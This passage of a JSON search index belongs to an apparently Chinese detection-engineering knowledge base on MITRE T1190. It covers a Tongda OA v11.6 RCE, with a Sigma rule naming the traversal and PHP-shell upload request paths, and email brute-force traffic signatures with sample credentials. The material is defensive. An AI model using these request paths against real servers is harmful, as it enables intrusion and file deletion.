high","title":"Sigma\u89c4\u5219"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E5%8F%AF%E7%96%91%E7%9A%84SQL%E9%94%99%E8%AF%AF%E6%B6%88%E6%81%AF/#_6","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E5%8F%AF%E7%96%91%E7%9A%84SQL%E9%94%99%E8%AF%AF%E6%B6%88%E6%81%AF/#_7","text":"MITRE-ATT&CK-T1190 https://attack.mitre.org/techniques/T1190/ Oracle\u62a5\u9519\u4fe1\u606f https://blog.csdn.net/rshp_520/article/details/44620463 MySQL\u62a5\u9519\u4fe1\u606f https://blog.csdn.net/attack_5/article/details/83548346 SQL Server\u62a5\u9519\u4fe1\u606f https://blog.csdn.net/dadaowuque/article/details/81016127 SQLite\u62a5\u9519\u4fe1\u606f https://blog.csdn.net/www121104115/article/details/75051685","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E9%80%9A%E8%BE%BEV11.6-RCE/","text":"T1190-\u901a\u8fbeV11.6-RCE\u6f0f\u6d1e \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u4f7f\u7528\u8f6f\u4ef6\uff0c\u6570\u636e\u6216\u547d\u4ee4\u6765\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u7684\u5f31\u70b9\uff0c\u4ece\u800c\u5bfc\u81f4\u610f\u5916\u6216\u65e0\u6cd5\u9884\u671f\u7684\u884c\u4e3a\u3002\u7cfb\u7edf\u7684\u5f31\u70b9\u53ef\u80fd\u662f\u9519\u8bef\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u662f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u4f8b\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u4f8b\u5982SMB \u6216SSH\uff09\u4ee5\u53ca\u5177\u6709Internet\u53ef\u8bbf\u95ee\u5f00\u653e\u7684\u4efb\u4f55\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\u3002\u6839\u636e\u6240\u5229\u7528\u7684\u7f3a\u9677\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u201c \u5229\u7528\u9632\u5fa1\u9632\u536b\u201d\u3002 \u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u57fa\u4e8e\u4e91\u7684\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5bf9\u5176\u8fdb\u884c\u5229\u7528\u53ef\u80fd\u4f1a\u5bfc\u81f4\u57fa\u7840\u5b9e\u9645\u5e94\u7528\u53d7\u5230\u635f\u5bb3\u3002\u8fd9\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u8bbf\u95ee\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u7684\u8def\u5f84\u3002 \u5bf9\u4e8e\u7f51\u7ad9\u548c\u6570\u636e\u5e93\uff0cOWASP\u6392\u540d\u524d10\u4f4d\u548cCWE\u6392\u540d\u524d25\u4f4d\u7a81\u51fa\u4e86\u6700\u5e38\u89c1\u7684\u57fa\u4e8eWeb\u7684\u6f0f\u6d1e\u3002 \u6d4b\u8bd5\u6848\u4f8b \u901a\u8fbeOA\uff08Office Anywhere\u7f51\u7edc\u667a\u80fd\u529e\u516c\u7cfb\u7edf\uff09\u662f\u7531\u5317\u4eac\u901a\u8fbe\u4fe1\u79d1\u79d1\u6280\u6709\u9650\u516c\u53f8\u81ea\u4e3b\u7814\u53d1\u7684\u534f\u540c\u529e\u516c\u81ea\u52a8\u5316\u7cfb\u7edf\uff0c\u5305\u62ec\u6d41\u7a0b\u5ba1\u6279\u3001\u884c\u653f\u529e\u516c\u3001\u65e5\u5e38\u4e8b\u52a1\u3001\u6570\u636e\u7edf\u8ba1\u5206\u6790\u3001\u5373\u65f6\u901a\u8baf\u3001\u79fb\u52a8\u529e\u516c\u7b49\u3002 \u8be5exp\u4f1a\u5220\u9664uth.inc.php\u6587\u4ef6\u5bfc\u81f4OA\u7cfb\u7edf\u7cfb\u7edf\u5f02\u5e38\u3002 \u76ee\u524d\u5df2\u77e5\u53d7\u5f71\u54cd\u7248\u672c\uff1aV11.6 \u68c0\u6d4b\u65e5\u5fd7 HTTP.log \u6d4b\u8bd5\u590d\u73b0 \u6f0f\u6d1e\u590d\u73b0\u5efa\u8bae\u53c2\u8003\u4ee5\u4e0b\u6587\u7ae0 https://www.cnblogs.com/L0ading/p/13529013.html \u6d4b\u8bd5\u7559\u75d5 \u53ef\u81ea\u884c\u672c\u5730\u6d4b\u8bd5\u6293\u53d6\u6d41\u91cf \u68c0\u6d4b\u89c4\u5219/\u601d\u8def Sigma\u89c4\u5219 \u5efa\u8bae\u4f7f\u7528HTTP\u6d41\u91cf+\u5b89\u5168\u8bbe\u5907\u8fdb\u884c\u68c0\u6d4b\u5206\u6790\u5224\u65ad\u653b\u51fb\u662f\u5426\u6210\u529f\u3002 title: \u901a\u8fbeOA v11.6 RCE description: \u68c0\u6d4b\u901a\u8fbeOA v11.6 RCE\u6f0f\u6d1e author: 12306Bro date: 2020/08/19 status: experimental references: - https://www.cnblogs.com/L0ading/p/13529013.html logsource: category: webserver detection: selection1: c-uri: - '//module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php' #\u54cd\u5e94\u5305\u72b6\u6001\u7801\u4e3a200 - '//inc/auth.inc.php' #\u54cd\u5e94\u5305\u72b6\u6001\u7801\u4e3a404\uff0c\u610f\u5473\u7740\u5220\u9664\u6210\u529f http.request.method: 'GET' #\u8bf7\u6c42\u65b9\u6cd5\u4e3aGET User-Agent: 'python-requests/*' #PY\u811a\u672c\u81ea\u5e26 selection2: c-uri: - '//general/data_center/utils/upload.php?action=upload&filetype=nmsl&repkid=/.%3C%3E./.%3C%3E./.%3C%3E./' #\u54cd\u5e94\u5305\u72b6\u6001\u7801\u4e3a200 http.request.method: 'POST' #\u8bf7\u6c42\u65b9\u6cd5\u4e3aPOST User-Agent: 'python-requests/*' #PY\u811a\u672c\u81ea\u5e26 Content-Disposition: form-data; name=\"FILE1\"; filename=\"*.php\" #\u5199\u5165shell\u6587\u4ef6 condition: selection1 or selection2 #\u5f53\u6761\u4ef61\u548c\u6761\u4ef62\u51fa\u73b0\u4efb\u610f\u4e00\u4e2a\u65f6\uff0c\u610f\u5473\u7740\u4f60\u53ef\u80fd\u6b63\u5728\u906d\u53d7\u63a2\u6d4b\u6027\u653b\u51fb\uff0c\u5982\u679c\u5728\u77ed\u65f6\u95f4\u5185\u51fa\u73b0\u4e86\u6761\u4ef61\u540e\uff0c\u51fa\u73b0\u4e86\u6761\u4ef62\uff0c\u5e76\u4e14\u8fd4\u56de\u5305\u72b6\u6001\u7801\u4e3a200\uff0c\u610f\u5473\u7740\u653b\u51fb\u6b63\u5728\u53d1\u751f\uff0c\u53ef\u80fd\u5165\u4fb5\u6210\u529f\u3002 falsepositives: - Unknown level: critical \u6b64\u89c4\u5219\u68c0\u6d4b\u9897\u7c92\u5ea6\u8f83\u7ec6\uff0c\u5efa\u8bae\u6839\u636e\u6570\u636e\u6e90\u7b49\u5b9e\u9645\u60c5\u51b5\u8fdb\u884c\u8c03\u6574\u3002 \u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1190 https://attack.mitre.org/techniques/T1190/ \u6700\u65b0\u901a\u8fbeOA11.6\u7248\u672c\u524d\u53f0getshell\u6f0f\u6d1e\u590d\u73b0 https://www.cnblogs.com/L0ading/p/13529013.html","title":"T1190-\u901a\u8fbeV11.6-RCE\u6f0f\u6d1e"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E9%80%9A%E8%BE%BEV11.6-RCE/#t1190-v116-rce","text":"","title":"T1190-\u901a\u8fbeV11.6-RCE\u6f0f\u6d1e"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E9%80%9A%E8%BE%BEV11.6-RCE/#attck","text":"\u4f7f\u7528\u8f6f\u4ef6\uff0c\u6570\u636e\u6216\u547d\u4ee4\u6765\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u7684\u5f31\u70b9\uff0c\u4ece\u800c\u5bfc\u81f4\u610f\u5916\u6216\u65e0\u6cd5\u9884\u671f\u7684\u884c\u4e3a\u3002\u7cfb\u7edf\u7684\u5f31\u70b9\u53ef\u80fd\u662f\u9519\u8bef\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u662f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u4f8b\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u4f8b\u5982SMB \u6216SSH\uff09\u4ee5\u53ca\u5177\u6709Internet\u53ef\u8bbf\u95ee\u5f00\u653e\u7684\u4efb\u4f55\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\u3002\u6839\u636e\u6240\u5229\u7528\u7684\u7f3a\u9677\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u201c \u5229\u7528\u9632\u5fa1\u9632\u536b\u201d\u3002 \u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u57fa\u4e8e\u4e91\u7684\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5bf9\u5176\u8fdb\u884c\u5229\u7528\u53ef\u80fd\u4f1a\u5bfc\u81f4\u57fa\u7840\u5b9e\u9645\u5e94\u7528\u53d7\u5230\u635f\u5bb3\u3002\u8fd9\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u8bbf\u95ee\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u7684\u8def\u5f84\u3002 \u5bf9\u4e8e\u7f51\u7ad9\u548c\u6570\u636e\u5e93\uff0cOWASP\u6392\u540d\u524d10\u4f4d\u548cCWE\u6392\u540d\u524d25\u4f4d\u7a81\u51fa\u4e86\u6700\u5e38\u89c1\u7684\u57fa\u4e8eWeb\u7684\u6f0f\u6d1e\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E9%80%9A%E8%BE%BEV11.6-RCE/#_1","text":"\u901a\u8fbeOA\uff08Office Anywhere\u7f51\u7edc\u667a\u80fd\u529e\u516c\u7cfb\u7edf\uff09\u662f\u7531\u5317\u4eac\u901a\u8fbe\u4fe1\u79d1\u79d1\u6280\u6709\u9650\u516c\u53f8\u81ea\u4e3b\u7814\u53d1\u7684\u534f\u540c\u529e\u516c\u81ea\u52a8\u5316\u7cfb\u7edf\uff0c\u5305\u62ec\u6d41\u7a0b\u5ba1\u6279\u3001\u884c\u653f\u529e\u516c\u3001\u65e5\u5e38\u4e8b\u52a1\u3001\u6570\u636e\u7edf\u8ba1\u5206\u6790\u3001\u5373\u65f6\u901a\u8baf\u3001\u79fb\u52a8\u529e\u516c\u7b49\u3002 \u8be5exp\u4f1a\u5220\u9664uth.inc.php\u6587\u4ef6\u5bfc\u81f4OA\u7cfb\u7edf\u7cfb\u7edf\u5f02\u5e38\u3002 \u76ee\u524d\u5df2\u77e5\u53d7\u5f71\u54cd\u7248\u672c\uff1aV11.6","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E9%80%9A%E8%BE%BEV11.6-RCE/#_2","text":"HTTP.log","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E9%80%9A%E8%BE%BEV11.6-RCE/#_3","text":"\u6f0f\u6d1e\u590d\u73b0\u5efa\u8bae\u53c2\u8003\u4ee5\u4e0b\u6587\u7ae0 https://www.cnblogs.com/L0ading/p/13529013.html","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E9%80%9A%E8%BE%BEV11.6-RCE/#_4","text":"\u53ef\u81ea\u884c\u672c\u5730\u6d4b\u8bd5\u6293\u53d6\u6d41\u91cf","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E9%80%9A%E8%BE%BEV11.6-RCE/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E9%80%9A%E8%BE%BEV11.6-RCE/#sigma","text":"\u5efa\u8bae\u4f7f\u7528HTTP\u6d41\u91cf+\u5b89\u5168\u8bbe\u5907\u8fdb\u884c\u68c0\u6d4b\u5206\u6790\u5224\u65ad\u653b\u51fb\u662f\u5426\u6210\u529f\u3002 title: \u901a\u8fbeOA v11.6 RCE description: \u68c0\u6d4b\u901a\u8fbeOA v11.6 RCE\u6f0f\u6d1e author: 12306Bro date: 2020/08/19 status: experimental references: - https://www.cnblogs.com/L0ading/p/13529013.html logsource: category: webserver detection: selection1: c-uri: - '//module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php' #\u54cd\u5e94\u5305\u72b6\u6001\u7801\u4e3a200 - '//inc/auth.inc.php' #\u54cd\u5e94\u5305\u72b6\u6001\u7801\u4e3a404\uff0c\u610f\u5473\u7740\u5220\u9664\u6210\u529f http.request.method: 'GET' #\u8bf7\u6c42\u65b9\u6cd5\u4e3aGET User-Agent: 'python-requests/*' #PY\u811a\u672c\u81ea\u5e26 selection2: c-uri: - '//general/data_center/utils/upload.php?action=upload&filetype=nmsl&repkid=/.%3C%3E./.%3C%3E./.%3C%3E./' #\u54cd\u5e94\u5305\u72b6\u6001\u7801\u4e3a200 http.request.method: 'POST' #\u8bf7\u6c42\u65b9\u6cd5\u4e3aPOST User-Agent: 'python-requests/*' #PY\u811a\u672c\u81ea\u5e26 Content-Disposition: form-data; name=\"FILE1\"; filename=\"*.php\" #\u5199\u5165shell\u6587\u4ef6 condition: selection1 or selection2 #\u5f53\u6761\u4ef61\u548c\u6761\u4ef62\u51fa\u73b0\u4efb\u610f\u4e00\u4e2a\u65f6\uff0c\u610f\u5473\u7740\u4f60\u53ef\u80fd\u6b63\u5728\u906d\u53d7\u63a2\u6d4b\u6027\u653b\u51fb\uff0c\u5982\u679c\u5728\u77ed\u65f6\u95f4\u5185\u51fa\u73b0\u4e86\u6761\u4ef61\u540e\uff0c\u51fa\u73b0\u4e86\u6761\u4ef62\uff0c\u5e76\u4e14\u8fd4\u56de\u5305\u72b6\u6001\u7801\u4e3a200\uff0c\u610f\u5473\u7740\u653b\u51fb\u6b63\u5728\u53d1\u751f\uff0c\u53ef\u80fd\u5165\u4fb5\u6210\u529f\u3002 falsepositives: - Unknown level: critical \u6b64\u89c4\u5219\u68c0\u6d4b\u9897\u7c92\u5ea6\u8f83\u7ec6\uff0c\u5efa\u8bae\u6839\u636e\u6570\u636e\u6e90\u7b49\u5b9e\u9645\u60c5\u51b5\u8fdb\u884c\u8c03\u6574\u3002","title":"Sigma\u89c4\u5219"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E9%80%9A%E8%BE%BEV11.6-RCE/#_6","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E9%80%9A%E8%BE%BEV11.6-RCE/#_7","text":"MITRE-ATT&CK-T1190 https://attack.mitre.org/techniques/T1190/ \u6700\u65b0\u901a\u8fbeOA11.6\u7248\u672c\u524d\u53f0getshell\u6f0f\u6d1e\u590d\u73b0 https://www.cnblogs.com/L0ading/p/13529013.html","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E9%82%AE%E7%AE%B1%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/","text":"T1190-\u90ae\u7bb1\u66b4\u529b\u7834\u89e3\u653b\u51fb\u6d41\u91cf\u5206\u6790 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u4f7f\u7528\u8f6f\u4ef6\uff0c\u6570\u636e\u6216\u547d\u4ee4\u6765\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u7684\u5f31\u70b9\uff0c\u4ece\u800c\u5bfc\u81f4\u610f\u5916\u6216\u65e0\u6cd5\u9884\u671f\u7684\u884c\u4e3a\u3002\u7cfb\u7edf\u7684\u5f31\u70b9\u53ef\u80fd\u662f\u9519\u8bef\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u662f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u4f8b\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u4f8b\u5982SMB \u6216SSH\uff09\u4ee5\u53ca\u5177\u6709Internet\u53ef\u8bbf\u95ee\u5f00\u653e\u7684\u4efb\u4f55\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\u3002\u6839\u636e\u6240\u5229\u7528\u7684\u7f3a\u9677\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u201c \u5229\u7528\u9632\u5fa1\u9632\u536b\u201d\u3002 \u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u57fa\u4e8e\u4e91\u7684\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5bf9\u5176\u8fdb\u884c\u5229\u7528\u53ef\u80fd\u4f1a\u5bfc\u81f4\u57fa\u7840\u5b9e\u9645\u5e94\u7528\u53d7\u5230\u635f\u5bb3\u3002\u8fd9\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u8bbf\u95ee\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u7684\u8def\u5f84\u3002 \u5bf9\u4e8e\u7f51\u7ad9\u548c\u6570\u636e\u5e93\uff0cOWASP\u6392\u540d\u524d10\u4f4d\u548cCWE\u6392\u540d\u524d25\u4f4d\u7a81\u51fa\u4e86\u6700\u5e38\u89c1\u7684\u57fa\u4e8eWeb\u7684\u6f0f\u6d1e\u3002 \u6d4b\u8bd5\u6848\u4f8b \u672c\u6587\u6848\u4f8b\u4e3b\u8981\u53c2\u8003\u3001\u6458\u5f55\u81ea\u300a\u73b0\u573a\u53d6\u8bc1\u4e4b\u6d41\u91cf\u5206\u6790\u603b\u7ed3\u300b\uff0c\u4e0a \u94fe\u63a5 \u68c0\u6d4b\u65e5\u5fd7 \u5168\u6d41\u91cf \u6d4b\u8bd5\u590d\u73b0 \u6682\u65e0\uff0c\u67e5\u770b\u6d4b\u8bd5\u6587\u6863\u3002 \u6d4b\u8bd5\u7559\u75d5 \u6682\u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def POP3\u534f\u8bae \u534f\u8bae\u8ba4\u8bc1\u8fc7\u7a0b CAPA //\u7528\u4e8e\u53d6\u5f97\u6b64\u670d\u52a1\u5668\u7684\u529f\u80fd\u9009\u9879\u6e05\u5355 +OK Capability list follows TOP USER PIPELINING EXPIRE NEVER UIDL +OK Mail Server POP3 ready user a1@a.com ---------------------\u8f93\u5165\u7528\u6237\u540d, username \u4e3a\u5177\u4f53\u7684\u7528\u6237\u540d +OK -------------------------------\u6267\u884c\u547d\u4ee4\u6210\u529f pass q1q1q1q1 ---------------------\u8f93\u5165\u7528\u6237\u5bc6\u7801\uff0cpassword \u4e3a\u5177\u4f53\u7684\u5bc6\u7801\uff0c\u8fd9\u91cc\u8981\u6ce8\u610f\uff0c\u5f53\u5bc6\u7801\u8f93\u5165\u9519\u8bef\u540e\u8981\u91cd\u65b0user username\u540e\u518d\u8fd0\u884c\u6b64\u547d\u4ee4\uff0c\u5426\u5219\u63d0\u793a\u547d\u4ee4\u65e0\u6548 +OK 2 messages ---------------------\u5bc6\u7801\u8ba4\u8bc1\u901a\u8fc7 (-ERR authorization failed ---------\u5bc6\u7801\u8ba4\u8bc1\u5931\u8d25) (+OK User successfully logged on. --\u8ba4\u8bc1\u6210\u529f) stat -------------------------------\u90ae\u7bb1\u72b6\u6001 +OK 2 6415 -------------------------2 \u4e3a\u8be5\u4fe1\u7bb1\u603b\u90ae\u4ef6\u6570\uff0c6415 \u4e3a\u603b\u5b57\u8282\u6570 list -------------------------------\u5217\u51fa\u6bcf\u5c01\u90ae\u4ef6\u7684\u5b57\u8282\u6570 +OK --------------------------------\u6267\u884c\u547d\u4ee4\u6210\u529f\uff0c\u5f00\u59cb\u663e\u793a\uff0c\u5de6\u8fb9\u4e3a\u90ae\u4ef6\u7684\u5e8f\u53f7\uff0c\u53f3\u8fb9\u4e3a\u8be5\u90ae\u4ef6\u7684\u5927\u5c0f 1 537 ------------------------------\u7b2c 1 \u5c01\u90ae\u4ef6\uff0c\u5927\u5c0f\u4e3a 537 \u5b57\u8282 2 5878 -----------------------------\u7b2c 2 \u5c01\u90ae\u4ef6\uff0c\u5927\u5c0f\u4e3a 5878 \u5b57\u8282 +OK Microsoft Exchange Server 2003 POP3 .......... 6.5.6944.0 .......... \u66b4\u529b\u7834\u89e3\u7279\u5f81\uff1a \u653b\u51fb\u8005\u4e0d\u65ad\u8f93\u5165\u7528\u6237\u540djufeng001\uff0c\u4e0d\u540c\u7684\u5bc6\u7801\u8fdb\u884c\u5c1d\u8bd5\uff0c\u670d\u52a1\u5668\u4e5f\u5927\u91cf\u62a5\u9519\uff1a-ERR Logon failure: unknown user name or bad password\u3002 SMTP\u534f\u8bae \u534f\u8bae\u8ba4\u8bc1\u8fc7\u7a0b\uff1a 220 a-ba21a05129e24.test.org Microsoft ESMTP MAIL Service, Version: 6.0.3790.3959 ready at Thu, 6 Aug 2015 11:10:17 +0800 //\u670d\u52a1\u5c31\u7eea EHLO Mr.RightPC //\u4e3b\u673a\u540d 250-a-ba21a05129e24.test.org Hello [192.1.14.228] \u2026\u2026 250 OK AUTH LOGIN // \u8ba4\u8bc1\u5f00\u59cb 334 VXNlcm5hbWU6 // Username: cGFzc0AxMjM= // \u8f93\u5165\u7528\u6237\u540d\u7684base64\u7f16\u7801 334 UGFzc3dvcmQ6 // Password: MXFhekBXU1g= // \u8f93\u5165\u5bc6\u7801\u7684base64\u7f16\u7801 235 2.7.0 Authentication successful. //\u8ba4\u8bc1\u6210\u529f \u66b4\u529b\u7834\u89e3\u7279\u5f81\uff1a \u653b\u51fb\u8005\u4e0d\u65ad\u8f93\u5165\u7528\u6237\u540djufeng001\uff0c\u4e0d\u540c\u7684\u5bc6\u7801\u8fdb\u884c\u5c1d\u8bd5\uff0c\u670d\u52a1\u5668\u4e5f\u5927\u91cf\u62a5\u9519\uff1a535 5.7.3 Authentication unsuccessful\u3002 IMAP\u534f\u8bae \u534f\u8bae\u8ba4\u8bc1\u8fc7\u7a0b\uff1a bf8p CAPABILITY * CAPABILITY IMAP4 IMAP4rev1 IDLE LOGIN-REFERRALS MAILBOX-REFERRALS NAMESPACE LITERAL+ UIDPLUS CHILDREN bf8p OK CAPABILITY completed. s3yg LOGIN \"administrator\" \"1qaz@WSX\" //\u8f93\u5165\u7528\u6237\u540d:administrator\uff0c\u5bc6\u7801:1qaz@WSX s3yg OK LOGIN completed. //\u8ba4\u8bc1\u6210\u529f \u66b4\u529b\u7834\u89e3\u7279\u5f81\uff1a IMAP\u7206\u7834\u4f1a\u4e0d\u65ad\u91cd\u590dLOGIN \"\u7528\u6237\u540d\" \"\u5bc6\u7801\"\uff0c\u4ee5\u53ca\u767b\u5f55\u5931\u8d25\u7684\u62a5\u9519\uff1aNO Logon failure: unknown user name or bad password\u3002 HTTP\u534f\u8bae HTTP\u767b\u5f55\u9875\u9762\u770b\u662f\u5426\u5b58\u5728302\u9875\u9762\u8df3\u8f6c\u5224\u65ad\u4e3a\u767b\u5f55\u6210\u529f\u3002 Referer: http://192.1.14.199:8080/login.html //\u767b\u5f55\u5730\u5740 uname=admin&upass=1qaz%40WSXHTTP/1.1 200 OK \u2026 <script>alert('OK')</script> //\u8f93\u5165\u7528\u6237\u540dadmin\uff0c\u5bc6\u78011qaz%40WSX\uff0cWeb\u670d\u52a1\u5668\u8fd4\u56deHTTP/1.1 200\u548c\u5f39\u51fa\u5bf9\u8bdd\u6846\u201cOK\u201d\u8868\u793a\u8ba4\u8bc1\u6210\u529f\u3002 \u66b4\u529b\u7834\u89e3\u7279\u5f81\uff1a \u77ed\u65f6\u95f4\u5185\u51fa\u73b0\u5927\u91cf\u767b\u5f55\u9875\u9762\u7684\u8bf7\u6c42\u5305\u3002 HTTPS\u534f\u8bae HTTPS\u534f\u8bae\u4e3a\u52a0\u5bc6\u534f\u8bae\uff0c\u4ece\u6570\u636e\u5f88\u96be\u5224\u65ad\u8ba4\u8bc1\u662f\u5426\u6210\u529f\uff0c\u53ea\u80fd\u6839\u636e\u6570\u636e\u5934\u90e8\u7ed3\u5408\u793e\u4f1a\u5de5\u7a0b\u5b66\u624d\u80fd\u5224\u65ad\u3002\u5982\u8ba4\u8bc1\u540e\u6709\u65e0\u67e5\u770b\u7f51\u9875\u3001\u90ae\u4ef6\u7684\u6b65\u9aa4\uff0c\u5982\u6709\uff0c\u5c31\u4f1a\u4ea7\u751f\u52a0\u5bc6\u6570\u636e\u3002 \u66b4\u529b\u7834\u89e3\u7279\u5f81\uff1a \u7206\u7834\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u65ad\u51fa\u73b0\u8ba4\u8bc1\u8fc7\u7a0b\uff1a\u201cClient Hello\u201d\u3001\u201cServer Hello\u201d\u7b49\uff0c\u5e76\u672a\u51fa\u73b0\u767b\u5f55\u6210\u529f\u540e\u64cd\u4f5c\u7684\u5927\u91cf\u52a0\u5bc6\u6570\u636e\u3002\u5728\u4e0d\u52302\u79d2\u7684\u65f6\u95f4\u5c31\u51fa\u73b016\u6b21\u8ba4\u8bc1\uff0c\u57fa\u672c\u53ef\u4ee5\u5224\u65ad\u4e3a\u66b4\u529b\u7834\u89e3\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1190 https://attack.mitre.org/techniques/T1190/ \u73b0\u573a\u53d6\u8bc1\u4e4b\u6d41\u91cf\u5206\u6790\u603b\u7ed3 https://my.oschina.net/u/4395026/blog/3783867","title":"T1190-\u90ae\u7bb1\u66b4\u529b\u7834\u89e3\u653b\u51fb\u6d41\u91cf\u5206\u6790"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E9%82%AE%E7%AE%B1%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/#t1190-","text":"","title":"T1190-\u90ae\u7bb1\u66b4\u529b\u7834\u89e3\u653b\u51fb\u6d41\u91cf\u5206\u6790"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E9%82%AE%E7%AE%B1%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/#attck","text":"\u4f7f\u7528\u8f6f\u4ef6\uff0c\u6570\u636e\u6216\u547d\u4ee4\u6765\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u7684\u5f31\u70b9\uff0c\u4ece\u800c\u5bfc\u81f4\u610f\u5916\u6216\u65e0\u6cd5\u9884\u671f\u7684\u884c\u4e3a\u3002\u7cfb\u7edf\u7684\u5f31\u70b9\u53ef\u80fd\u662f\u9519\u8bef\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u662f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u4f8b\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u4f8b\